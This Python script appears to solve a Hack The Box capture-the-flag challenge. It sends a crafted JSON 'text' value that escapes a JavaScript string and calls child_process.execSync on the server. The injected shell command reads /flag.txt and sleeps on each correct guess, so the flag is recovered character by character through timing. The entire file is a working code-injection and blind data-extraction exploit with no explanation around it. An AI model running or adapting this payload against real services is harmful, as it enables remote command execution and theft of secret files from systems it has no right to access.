import requests
import time

def send_request(idx, payload, sleep_time):
    url = 'http://host:port/api/service/generate'

    token = 'jwtToken'

    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {token}'
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }
    
    data = {
        "text": f" '}}) + require('child_process').execSync('cat /flag.txt | head -c {idx+1} | {{ read c; if [ \"$c\" = \"{payload}\" ]; then sleep {sleep_time}; fi; }}') // "
    }
    
    start_time = time.time()
    response = requests.post(url, headers=headers, json=data)
    end_time = time.time()

    return response, end_time - start_time

def brute_force():
    alphabet = [chr(i) for i in range(32, 127)] 
    #alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!{}'
    target_time = 10  # Adjust based on expected delay
    result = 'HTB{'
    completed = False
    idx = 4 # Start from 4th character of the flag - HTB{ - 4 characters

    while not completed:      
        for char in alphabet:
            _, exec_time = send_request(idx, result+char, target_time)

            if exec_time >= target_time:
                result += char

                if char == '}':
                    completed = True

                print(f"Found: {result} - {exec_time} - {idx}")
                break

        idx += 1

    print(f"Brute force result: {result}")

if __name__ == "__main__":
    brute_force()
